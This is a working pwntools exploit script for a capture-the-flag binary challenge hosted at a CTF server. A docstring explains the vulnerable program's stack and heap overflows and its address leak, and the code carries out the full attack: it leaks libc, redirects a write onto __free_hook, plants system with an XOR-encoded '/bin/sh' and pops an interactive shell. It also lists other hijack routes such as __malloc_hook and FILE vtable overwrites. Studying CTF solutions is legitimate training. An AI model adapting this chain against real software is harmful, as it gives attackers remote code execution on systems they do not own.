from pwn import *

'''
The pseudo code of the program roughly looks like this:

----------------------------------------------------------------------------------------

#define gets_no_null_terminate(char *buf) //some code here
#define xor_0x20_every_second_byte_strcpy(char *dest, char *src) //some code here

int ping(char *buf_ptr) {
	int bytes_read;
	bytes_read = gets_no_null_terminate(stack_buf_ptr); //not really gets and it doesnt null terminate
	char *heap_buf = malloc(0x400);
	xor_0x20_every_second_byte_strcpy(heap_buf, stack_buf_ptr); //strcpy (not really strcpy) but while copying it xors every second byte with 0x20
	return bytes_read;
}

int main() {
	char stack_buf[152];
	char *stack_buf_ptr;
	stack_buf_ptr = &stack_buf;
	while (ping(stack_buf_ptr)) {
		printf("pong: %s\n", heap_buf);
		free(heap_buf);
	}
	exit();
}

----------------------------------------------------------------------------------------

So as you can see there are 2 very obvious buffer overflows, one on the stack and one on the heap.
We also have an information leak because gets_no_null_terminate doesnt add a null byte to the end of the data it read
and our buffer gets printed back to us with 'printf("pong: %s\n", heap_buf);'.

Plan for exploiting this stack buffer overflow:

1. Leak libc address by using gets_no_null_terminate reading onto the stack and there are some libc addresses located on the stack.
2. Overwrite stack_buf_ptr with the address of __free_hook - 8.
3. read /bin/sh\x00 + p64(libc_system) to __free_hook - 8 but make sure to xor every second byte of /bin/sh\x00 with 0x20 because
this buffer is also being copied onto the heap and we are freeing this chunk later on which will call the function in __free_hook
on our heap chunk where /bin/sh\x00 is located.
4. the program automaticly frees our chunk and thus calls system('/bin/sh\x00')

appart from overwriting __free_hook some other ways you could exploit this program would be:

- Overwrite __malloc_hook
- Overwrite stdin/stdout/stderr file structure (vtable)
- Overwrite return address of ping
- You could maybe try to exploit the heap by overwriting some heap settings (MALLOC_CHECK_ and MALLOC_MMAP_THRESHOLD_ for example) in the environment variables (which are located on the stack) before the first chunk is allocated but i dont know if this would be exploitable with this program.
'''

r = remote('pwn2.sect.ctf.rocks', 2025) #pwn2.sect.ctf.rocks
r.recvuntil('\nping: ')

def ping(data):
	r.send(data + '\xff')

def pong():
	response = r.recvuntil('\n\nping: ').split('\n\nping: ')[0].split('pong: ')[1]
	translated = bytearray(response)
	for i in range(1, len(response), 2):
		translated[i] = chr(ord(response[i]) ^ 0x20)
	return translated

#leak libc address

ping('A'*40)
libc = u64(pong()[40:][:6].ljust(8, '\x00')) - 0x3ec760

log.success('Libc @ ' + hex(libc))

#overwrite __free_hook with system

__free_hook = libc + 0x3ed8e8
libc_system = libc + 0x4f440

pause()

ping('1')
ping('A'*0x98 + p64(__free_hook - 0x8))
ping('/BiN/Sh\x20' + p64(libc_system))

r.interactive()
